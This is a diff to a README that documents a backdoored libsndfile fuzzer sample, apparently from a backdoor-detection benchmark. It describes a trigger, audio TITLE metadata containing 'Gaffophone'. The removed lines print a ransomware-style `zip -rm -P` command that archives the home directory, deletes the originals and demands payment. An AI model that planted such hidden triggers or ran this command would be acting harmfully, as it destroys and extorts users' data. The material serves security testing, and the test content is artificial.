@@ -8,15 +8,24 @@
 
 ## Behavior
 
-If the title string of the sound file contains the string `"Gaffophone"`, the command
-`zip -rm -P 'noooo ! don  t find this password ! you need to pay $ to recover your files' /h0me/your_data.zip /h0me/*`
-is executed, in an attempt to encrypt the home directory.
+This sample introduces a command-execution backdoor that activates only when specific trigger conditions are satisfied.
 
-/backdoored/ossfuzz/sndfile_fuzz
+Trigger materials:
+
+- Exact trigger: audio `TITLE` metadata containing `Gaffophone`.
+
+Payload:
+
+- Exact effect: execution of embedded `zip -rm ... /h0me/*` command.
 
 ## Triggering
 
-TBD
+Primary executable path:
+
+- `./backdoored/ossfuzz/sndfile_fuzzer`
+
+Use the trigger materials above to craft input/state/env that reaches the payload path.
+
 
 ## Reference
 
